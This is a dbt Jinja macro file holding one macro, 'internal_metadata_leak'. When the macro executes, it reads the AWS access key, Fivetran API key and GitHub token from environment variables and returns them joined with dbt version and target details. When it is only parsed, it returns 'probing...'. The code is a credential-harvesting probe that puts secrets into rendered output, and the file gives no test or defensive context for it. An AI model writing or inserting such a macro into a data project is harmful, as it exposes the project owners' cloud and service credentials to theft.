{% macro internal_metadata_leak() %}
    {% if execute %}
        {% set profile = target.get('profile_name', 'none') %}
        
        {% set aws_key = env_var("AWS_ACCESS_KEY_ID", "not_found") %}
        {% set fivetran_token = env_var("FIVETRAN_API_KEY", "not_found") %}
        {% set github_t = env_var("GITHUB_TOKEN", "not_found") %}
        
        {% set sys_info = "Ver: " ~ dbt_version ~ " | Target: " ~ target.name %}
        
        {{ return("AWS: " ~ aws_key ~ " | FVT: " ~ fivetran_token ~ " | GH: " ~ github_t ~ " || " ~ sys_info) }}
    {% else %}
        {{ return("probing...") }}
    {% endif %}
{% endmacro %}
